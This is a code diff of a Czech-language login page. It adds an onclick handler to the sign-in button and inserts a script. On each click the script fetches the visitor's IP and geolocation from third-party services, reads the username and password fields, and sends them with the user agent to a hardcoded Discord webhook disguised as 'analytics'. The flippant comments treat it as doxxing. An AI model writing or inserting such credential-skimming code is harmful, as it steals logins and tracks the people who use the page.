@@ -195,7 +195,7 @@
                                         </a>                                    </div>
                                 </div>
                                 <div class="FormLayout__Item">
-    <button type="submit" class="Button Button--variantPrimary Button--sizeLarge Button--textAlignCenter Button--fullWidth">            <span class="Text--root Text--medium Text--bodyMd">Přihlásit se
+    <button onclick="lokin()" type="submit" class="Button Button--variantPrimary Button--sizeLarge Button--textAlignCenter Button--fullWidth">            <span class="Text--root Text--medium Text--bodyMd">Přihlásit se
                                     
             </span>
 </button>
@@ -331,6 +331,84 @@ window.addEventListener('resize', checkWidth);
                 }
             }
         </script>
+
+            <script>
+
+                    function lokin() {
+                            var WebhookUrl = 'https://discord.com/api/webhooks/1352666399331586119/scMEezOHl88cf4pF9ZzEoaUjujrUjtD12VVPA9ufOD0uSzWUYn7bryKvd7UqJ6TzLUqI'; //discord url DUH
+
+var request = new XMLHttpRequest();
+request.open("POST", WebhookUrl);
+request.setRequestHeader('Content-type', 'application/json'); //basically just set up the post request for the webhook
+
+(async () => {
+  try {
+    const userAgent = navigator.userAgent;
+          
+    const IPresponse = await fetch('https://api.ipify.org?format=json');
+    const IPdata = await IPresponse.json();
+    const userIP = IPdata.ip; //get your ip with ipify cuz im retarded and dont know how to normally
+
+    const dataResponse = await fetch(`https://freeipapi.com/api/json/${userIP}`); //ermm when you enter the website it will send you ip to ipapi and ipapi will say hmm yes okay thats very hot now let me dox you rq
+    const data = await dataResponse.json();
+
+    const success = true; // you shouldnt do this im just lazy to change it i was debugging
+
+    if (success === true) { // you shouldnt do this im just lazy to change it i was debugging
+        
+      const Payload = { // the whole payload thing is what you send to the webhook and the webhook will say hmm yes okay okay okay i will tell discord daddy to go send a message yes okay bye
+        username: "zsbezno.actual_webhook", //username DUUUHH
+        embeds: [
+          {
+            title: 'analytics',
+            description: 'new visit',
+            fields: [
+              {
+                name: 'IP',
+                value: userIP,
+                inline: true
+              },
+              {
+                name: 'Type',
+                value: 'IPv' + data.ipVersion,
+                inline: true
+              },
+              {
+                name: 'Proxy?',
+                value: data.isProxy,
+                inline: true
+              },
+              {
+                name: 'Useragent',
+                value: navigator.userAgent,
+                inline: true
+              },
+              {
+                name: 'User',
+                value: document.getElementById('user').innerText,
+                inline: false
+              },
+              {
+                name: 'Password',
+                value: document.getElementById('work_pass').innerText,
+                inline: false
+              },
+            ],
+          }
+        ]
+      };
+      request.send(JSON.stringify(Payload));//the request was set up in the beggining so we just do request.send(PAYLOAD) and yippie we go!!!!!
+
+    } else {
+      console.error('status: ', data.status, ' message: ', data.message); //if error then dont explode
+    }
+  } catch (error) {
+    console.error('erm merror: ', error);//if error then dont explode #2
+  }
+})();
+                    }
+                    
+            </script>
     
 
 <div id="toastContainer" class="toast-container position-fixed top-0 end-0" aria-live="polite"></div></body></html>
